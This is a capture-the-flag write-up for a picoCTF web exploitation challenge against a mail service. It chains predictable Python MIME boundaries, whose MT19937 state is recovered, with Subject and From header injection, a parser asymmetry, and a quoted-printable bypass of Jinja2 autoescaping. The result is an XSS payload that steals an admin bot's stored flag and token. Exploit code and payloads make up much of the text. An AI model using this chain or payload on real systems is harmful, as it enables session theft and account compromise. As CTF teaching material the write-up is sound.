# secure-email-service

## Category
Web Exploitation

## Difficulty
Hard

## What fucked up

### 1. Predictable MIME boundaries

Python's `email` module generates MIME boundaries with `random.randrange(sys.maxsize)`. Under the hood, that's MT19937 and it is well-known to be fully recoverable from 624 consecutive outputs.

`user@ses` has no signing keys (created without `public_key`/`private_key` in `init.py`), so emails from this account are unsigned. Each email produces exactly one `random.randrange` call for its MIMEMultipart boundary:

```python
# util.py - generate_email()
msg = MIMEMultipart()
msg['Subject'] = subject
msg.attach(MIMEText(content))
# no sign -> just msg.as_string() -> one boundary generated
return msg.as_string()
```

Send 624 emails, extract boundary tokens, recover the MT state, predict what comes next.

Each boundary is 63 bits but MT19937 outputs 32-bit words. Each `randrange(sys.maxsize)` consumes two 32-bit outputs: `w0` (full 32 bits known) and `w1` (top 31 bits known, LSB discarded by `>> 1`). That 1-bit ambiguity on every odd-indexed MT state value means we can't just untemper directly. The solution uses the twist function's structure, even-indexed twist positions create constraints linking pairs of odd-indexed unknowns, and constraint propagation resolves all 312 ambiguous bits.

```python
# Each boundary -> two MT outputs, but w1's LSB is lost
p1_w0.append(boundaries[i] & 0xFFFFFFFF)          # fully known
p1_w1s.append((boundaries[i] >> 32) & 0x7FFFFFFF) # 31 bits, LSB unknown

# Two candidates for each odd MT state value
mt_odd_candidates[2*i + 1] = (
    untemper(w1s << 1),       # LSB = 0
    untemper((w1s << 1) | 1)  # LSB = 1
)
```

### 2. Subject header injection

The `/api/send` endpoint passes the subject straight into `msg['Subject']`. Python's Compat32 email policy (used by MIMEMultipart) doesn't reject multiline values, unlike the newer EmailPolicy which throws `ValueError`. So a subject containing `\n` creates additional header lines:

```python
# main.py - send endpoint for users with certs (admin)
msg = util.generate_email(
    subject=subject,                          # <-- no sanitization
    content=template.render(title=subject, content=body),  # subject in body too
    sign=True,
    cert=user.public_key,
    key=user.private_key
)
```

The subject goes into two places:
1. `msg['Subject'] = subject` -- headers (processed by Compat32 fold)
2. `template.render(title=subject)` -- the HTML body, inside `<h1>{{ title }}</h1>`

This dual placement is what makes the boundary collision possible.

### 3. WASM parser asymmetry (the space-prefix trick)

Whatever we inject into the Subject also appears in both the folded headers AND the template body. If we inject `Content-Type: text/html` as a raw line, it overrides the outer `Content-Type: multipart/signed` in the headers and breaks the signature verification.

The fix: prefix those lines with a space. In email headers, a leading space means "continuation of the previous header", so ` Content-Type : text/html` after the Subject line is just more Subject text.

But in MIME part bodies, the WASM parser treats that same space-prefixed line as a standalone header. This asymmetry is the entire attack:

| Context | ` Content-Type : text/html` | Result |
|---|---|---|
| Outer headers (fold output) | Continuation of Subject | Ignored -- multipart/signed preserved |
| Inner MIME part (body collision) | Treated as real CT header | Parser returns it as HTML |

### 4. QP bypass of Jinja2 autoescape

The template uses Jinja2 with `autoescape=True`:

```html
<!-- template.jinja2 -->
<h1>{{ title }}</h1>
<pre>{{ content }}</pre>
```

This escapes `<`, `>`, `&`, `"`, `'` -- but not `=` or hex digits. A quoted-printable encoded XSS payload passes through Jinja2 untouched:

```
=3Cimg src=3Dx onerror=3Dfetch(...)=3E
```

Jinja2 sees no angle brackets, outputs it as-is. The WASM parser then QP-decodes it back to `<img src=x onerror=fetch(...)>`.

### 5. From injection

The reply page sends to `parsed.from`:

```javascript
// reply.html
const parsed = await parse((await email(id)).data);
const subject = `Re: ${parsed.subject}`;

document.getElementById('reply').onsubmit = async e => {
    await send(parsed.from, subject, body);  // <-- sends to parsed.from
}
```

By appending `\nFrom : admin@ses` after the B-encoded subject in our attack email, the WASM parser sees `From: admin@ses` as a separate header. When admin clicks Reply, the reply goes to `admin@ses`, admin replies to themselves.

## Attack chain

### Step 1: Collect 624 boundaries

Login as `user@ses`, send 624 probe emails to self. Each generates one `random.randrange(sys.maxsize)` call. Extract the boundary token from each:

```python
BOUNDARY_RE = re.compile(r'boundary="={15}(\d{19})=="')

for i in range(624):
    eid = send_email(session, token, "user@ses", f"p{i}", "x")
    data = get_email_data(session, token, eid)
    tokens[i] = int(BOUNDARY_RE.search(data).group(1))
```

### Step 2: Recover MT state and predict

Feed 624 tokens into `recover_state()`, then predict the next 3 values:

```python
mt_state = recover_state(tokens)
predicted = predict_after(mt_state, 624, count=3)
# predicted[0] = our attack email boundary (we don't care about this one)
# predicted[1] = admin reply's inner boundary (this is the one we need)
# predicted[2] = admin reply's outer boundary
```

Why 3? Our attack email consumes one boundary (predicted[0]). Admin's reply is signed, which means `sign_message` generates two boundaries: inner (predicted[1] - the signed content) and outer (predicted[2] - the multipart/signed wrapper). We need predicted[1] for the boundary collision.

### Step 3: Build the attack subject

The Subject contains two parts: a B-encoded payload (the MIME injection) and a literal From header injection.

```python
def build_attack_subject(predicted_admin_inner_token):
    inner_str = f"==============={predicted_admin_inner_token:019d}=="

    xss_qp = (
        "=3Cimg src=3Dx onerror=3D"
        "fetch(=27/api/send=27,{method=3A=27POST=27,"
        "body=3AJSON.stringify({to=3A=27user@ses=27,"
        "subject=3AlocalStorage.flag,"
        "body=3A=27x=27}),"
        "headers=3A{=27Content-Type=27=3A=27application/json=27,"
        "token=3AlocalStorage.token}})"
        "=3E"
    )

    injection = (
        f"test\n"
        f" --{inner_str} \n"                           # space-prefixed boundary
        f" Content-Type : text/html\n"                  # space-prefixed CT
        f"Content-Transfer-Encoding : quoted-printable\n"  # no space prefix (ok either way)
        f"\n"                                           # blank line = header/body separator
        f"{xss_qp}\n"                                  # QP-encoded XSS
        f" --{inner_str}-- "                            # closing boundary
    )

    b64_payload = base64.b64encode(injection.encode()).decode()
    return f"=?utf-8?b?{b64_payload}?=\nFrom : admin@ses"
```

When admin reply, the reply subject is `Re: <decoded injection>`. The decoded text contains ` --===============XXXX== ` which matches the predicted inner boundary of the reply itself. The boundary appears in both the actual MIME structure and inside the HTML body, so the WASM parser sees an extra MIME part with our XSS.

The space prefix on boundary and Content-Type lines means Compat32's `Header.encode()` folds them as Subject continuations. The `Content-Transfer-Encoding` line has no space prefix, it becomes a standalone header in the outer headers, but that's fine because a stray CTE header doesn't break `multipart/signed` parsing.

### Step 4: First admin bot trigger

The admin bot does this on every trigger:

```python
# admin_bot.py
await page.evaluate('flag => localStorage.setItem("flag", flag)', flag)
# login, go to inbox
await page.click('tbody tr', timeout=1000)  # click first (newest) email
# view email, click Reply
await page.click('#reply button')
# type reply body, submit
await page.click('#reply button')
```

First trigger: admin opens our attack email, clicks Reply. The reply page parses the email, gets `parsed.from = "admin@ses"` (From injection) and `parsed.subject = <decoded B-encoded payload>`. Admin submits the reply with subject `Re: <decoded payload>`.

The server builds a signed email with that subject. The subject goes into:
- `msg['Subject']` -- Compat32 folds space-prefixed lines as continuations (harmless)
- `template.render(title=subject)` -- the HTML body, where the predicted boundary string creates a collision

### Step 5: Second admin bot trigger

Admin's inbox now has the reply as the newest email. The bot clicks it.  `email.html` does:

```javascript
// email.html -- the rendering pipeline
const parsed = await parse(msg.data);              // outer parse
if (parsed.html) {                                 // truthy for signed emails
    const signed = await getSigned(msg.data, await rootCert());  // verify sig
    if (signed) {
        const { html } = await parse(signed);      // inner parse (boundary collision here)
        const shadow = content.attachShadow({ mode: 'closed' });
        shadow.innerHTML = `<style>:host { all: initial }</style>${html}`;  // XSS fires
    }
}
```

The outer parse returns `html` as truthy because admin's emails include an HTML part. Signature verification passes because admin signed it with their own cert. The inner parse hits the boundary collision, the predicted boundary string appears in the body, so the parser treats the injected text as a separate MIME part with `Content-Type: text/html` and `CTE: quoted-printable`. It QP-decodes our payload back to:

```html
<img src=x onerror=fetch('/api/send',{method:'POST',body:JSON.stringify({to:'user@ses',subject:localStorage.flag,body:'x'}),headers:{'Content-Type':'application/json',token:localStorage.token}})>
```

The `<img>` gets inserted via `shadow.innerHTML`. The `src=x` fails to load, `onerror` fires, and the XSS sends the flag to `user@ses` as an email subject.

### Step 6: Read the flag

Poll `user@ses` inbox for an email whose data contains `picoCTF{`.

```python
def poll_flag(session, token, timeout=10):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        for email_data in session.get(f"{BASE}/api/emails",
                                      headers={"token": token}).json().values():
            m = re.search(r"picoCTF\{[^}]+\}", email_data["data"])
            if m:
                return m.group(0)
        time.sleep(0.5)
```

## Files

- ./src/exploit.py - full exploit
- ./src/mt_solve.py - MT19937 state recovery from 624 boundary
